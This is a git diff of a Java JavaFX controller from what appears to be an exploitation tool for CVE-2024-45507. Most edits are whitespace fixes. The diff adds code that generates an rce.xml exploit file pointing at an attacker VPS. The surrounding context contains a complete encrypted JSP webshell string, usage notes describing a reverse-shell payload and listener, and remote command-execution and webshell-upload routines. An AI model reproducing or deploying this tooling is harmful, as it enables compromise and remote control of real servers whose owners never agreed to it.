@@ -28,7 +28,7 @@ import java.util.HashMap;
  */
 
 // JavaFX图形化界面的控制类
-public class CVE_2024_45507_Controller extends MainController{
+public class CVE_2024_45507_Controller extends MainController {
     @FXML
     private ChoiceBox<String> choice_cve;
     @FXML
@@ -73,8 +73,8 @@ public class CVE_2024_45507_Controller extends MainController{
     public static String BASICINFO = Constants.SECURITYSTATEMENT +
 
             "使用方法: \r\n" +
-            "\t目标地址只需要填写域名和端口;\r\n"+
-            "\tvps的服务是指rce.xml利用文件在vps的访问地址;rce.xml文件中的payload包含反弹命令\r\n"+
+            "\t目标地址只需要填写域名和端口;\r\n" +
+            "\tvps的服务是指rce.xml利用文件在vps的访问地址;rce.xml文件中的payload包含反弹命令\r\n" +
             "\t还需要再vps上启动一个监听端口";
 
     public static String[] WEBLOGIC = {
@@ -88,7 +88,6 @@ public class CVE_2024_45507_Controller extends MainController{
     };
 
     public static String SHELL = "<%! String xc=\"3c6e0b8a9c15224a\"; String pass=\"pass\"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(\"AES\");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),\"AES\"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(\"MD5\");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName(\"java.util.Base64\");Object Encoder = base64.getMethod(\"getEncoder\", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod(\"encodeToString\", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(\"sun.misc.BASE64Encoder\"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(\"encode\", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName(\"java.util.Base64\");Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod(\"decode\", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(\"sun.misc.BASE64Decoder\"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod(\"decodeBuffer\", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute(\"payload\")==null){session.setAttribute(\"payload\",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute(\"parameters\",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute(\"payload\")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>";
-
 
 
     // 界面显示  一些默认的基本信息，漏洞列表、编码选项、线程、shell、页脚
@@ -131,17 +130,17 @@ public class CVE_2024_45507_Controller extends MainController{
         //
         // 切换界面保留原来的记录
         // 基本信息的历史记录
-        if(history.containsKey("WEBLOGIC_url")) {
+        if (history.containsKey("WEBLOGIC_url")) {
             this.url.setText((String) history.get("WEBLOGIC_url"));
         }
-        if(history.containsKey("WEBLOGIC_vulName")) {
+        if (history.containsKey("WEBLOGIC_vulName")) {
             this.choice_cve.setValue((String) history.get("WEBLOGIC_vulName"));
             this.choice_cve_batch.setValue((String) history.get("WEBLOGIC_vulName"));
         }
-        if(history.containsKey("WEBLOGIC_ei")) {
+        if (history.containsKey("WEBLOGIC_ei")) {
             this.ei = (ExploitInterface) history.get("WEBLOGIC_ei");
         }
-        if(history.containsKey("WEBLOGIC_basic_info")) {
+        if (history.containsKey("WEBLOGIC_basic_info")) {
             this.basic_info.setText((String) history.get("WEBLOGIC_basic_info"));
         } else {
             this.basic_info.setText(BASICINFO);
@@ -149,31 +148,30 @@ public class CVE_2024_45507_Controller extends MainController{
         this.basic_info.setWrapText(true);
 
         // 命令执行的历史记录
-        if(history.containsKey("WEBLOGIC_cmd")) {
+        if (history.containsKey("WEBLOGIC_cmd")) {
             this.cmd.setText((String) history.get("WEBLOGIC_cmd"));
         }
-        if(history.containsKey("WEBLOGIC_encoding")) {
+        if (history.containsKey("WEBLOGIC_encoding")) {
             this.encoding.setValue((String) history.get("WEBLOGIC_encoding"));
         }
-        if(history.containsKey("WEBLOGIC_cmd_info")) {
+        if (history.containsKey("WEBLOGIC_cmd_info")) {
             this.cmd_info.setText((String) history.get("WEBLOGIC_cmd_info"));
         }
 
         // 文件上传的历史记录
-        if(history.containsKey("WEBLOGIC_upload_info")) {
+        if (history.containsKey("WEBLOGIC_upload_info")) {
             this.upload_info.setText((String) history.get("WEBLOGIC_upload_info"));
         }
-        if(history.containsKey("WEBLOGIC_upload_path")) {
+        if (history.containsKey("WEBLOGIC_upload_path")) {
             this.upload_path.setText((String) history.get("WEBLOGIC_upload_path"));
         }
-        if(history.containsKey("WEBLOGIC_platform")) {
+        if (history.containsKey("WEBLOGIC_platform")) {
             this.platform.setValue((String) history.get("WEBLOGIC_platform"));
         }
-        if(history.containsKey("WEBLOGIC_upload_msg")) {
+        if (history.containsKey("WEBLOGIC_upload_msg")) {
             this.upload_msg.setText((String) history.get("WEBLOGIC_upload_msg"));
         }
     }
-
 
 
     /**
@@ -185,8 +183,8 @@ public class CVE_2024_45507_Controller extends MainController{
         FileChooser fileChooser = new FileChooser();
         fileChooser.getExtensionFilters().add(new FileChooser.ExtensionFilter("Text Files", "*.txt"));
         selectedFile = fileChooser.showOpenDialog(stage);
-        if (selectedFile  != null) {
-            filePathId.setText(selectedFile .getAbsolutePath());
+        if (selectedFile != null) {
+            filePathId.setText(selectedFile.getAbsolutePath());
         }
     }
 
@@ -262,8 +260,11 @@ public class CVE_2024_45507_Controller extends MainController{
 
     //生成利用文件
     @FXML
-    public void createRCExml(){
+    public void createRCExml() {
 
+        String vpsShell = this.vpsShell.getText().trim();
+        String[] ip_port = vpsShell.split(":");
+        GenerateRCEXML.cenerateRCEXML(ip_port[0], ip_port[1]);
     }
 
     // 点击检测，获取url 和 要检测的漏洞
@@ -314,8 +315,8 @@ public class CVE_2024_45507_Controller extends MainController{
 
         this.ei = Tools.getExploit("CVE-2024-45507");
         HashMap<String, String> entity = new HashMap<>();
-        entity.put("url",url);
-        entity.put("vpsUrl",vpsUrl);
+        entity.put("url", url);
+        entity.put("vpsUrl", vpsUrl);
         String result = this.ei.checkVul(entity);
 
         this.basic_info.setText("\r\n\t" + result + "\r\n\r\n\twebPath:\r\n\t\t" + this.ei.getWebPath());
@@ -336,12 +337,12 @@ public class CVE_2024_45507_Controller extends MainController{
         history.put("WEBLOGIC_cmd", this.cmd.getText());
         history.put("WEBLOGIC_encoding", this.encoding.getValue());
 
-        if(cmd.length() == 0) {
+        if (cmd.length() == 0) {
             cmd = "whoami";
         }
 
         try {
-            if(this.ei.isVul()) {
+            if (this.ei.isVul()) {
                 String result = this.ei.exeCmd(cmd, encoding);
                 this.cmd_info.setText(result);
 
@@ -368,12 +369,12 @@ public class CVE_2024_45507_Controller extends MainController{
         history.put("WEBLOGIC_upload_path", this.upload_path.getText());
         history.put("WEBLOGIC_platform", this.platform.getValue());
 
-        if(upload_path.length() == 0) {
+        if (upload_path.length() == 0) {
             upload_path = "test.jsp";
         }
 
-        if(shell_info.length() > 0) {
-            if(this.ei.isVul()) {
+        if (shell_info.length() > 0) {
+            if (this.ei.isVul()) {
                 try {
                     String result = this.ei.uploadFile(shell_info, upload_path, platform);
 
